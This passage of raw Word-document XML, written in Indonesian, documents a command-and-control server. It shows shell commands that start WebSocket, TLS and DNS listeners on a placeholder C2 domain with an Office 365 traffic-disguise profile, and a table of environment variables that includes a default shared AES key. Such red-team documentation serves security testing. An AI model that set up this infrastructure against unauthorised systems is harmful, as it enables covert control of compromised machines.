        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Listener Tambahan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># WebSocket listener (latensi command &lt;1 detik)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>ENCRYPTION_KEY=K3yRah4sia ./bin/server --ws --ws-port 8081</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DNS authoritative listener (butuh domain)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>ENCRYPTION_KEY=K3yRah4sia ./bin/server \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --dns \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --dns-domain c2.yourdomain.com \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --dns-port 5353</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Semua sekaligus</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>ENCRYPTION_KEY=K3yRah4sia ./bin/server \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --tls --tls-port 8443 \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --ws  --ws-port 8081  \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --dns --dns-domain c2.yourdomain.com \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --auth --api-key "s3cr3t-key"       \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --profile office365</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Variabel Lingkungan (Environment Variables)</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3025"/>
        <w:gridCol w:w="3025"/>
        <w:gridCol w:w="3025"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F1F1F"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Variabel</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F1F1F"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Default</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4535"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F1F1F"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Keterangan</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>ENCRYPTION_KEY</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>SpookyOrcaC2AES1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4535"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Kunci AES-256 — harus sama dengan agent</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>PORT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>8080</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4535"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Port HTTP utama</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>HOST</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>0.0.0.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4535"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Bind address</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>AUTH_ENABLED</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>false</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4535"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Aktifkan API key auth</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>API_KEY</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>your-api-key-here</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4535"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Kunci untuk operator</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>TLS_ENABLED</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>false</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4535"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Aktifkan HTTPS</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>TLS_PORT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>8443</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4535"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Port HTTPS</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>WS_ENABLED</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>false</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4535"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Aktifkan WebSocket listener</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>WS_PORT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>8081</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4535"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Port WebSocket</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>DNS_ENABLED</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>false</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4535"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Aktifkan DNS listener</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>DNS_PORT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>5353</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4535"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Port UDP DNS</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>DNS_DOMAIN</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4535"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Zone DNS authoritative</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>ADMIN_KEY</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4535"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Secret untuk promote ke role admin</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>LOG_DIR</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>./logs</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4535"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Direktori log output</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>DB_PATH</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>./data/taburtuai.db</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4535"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Path database SQLite</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="240" w:after="80"/>
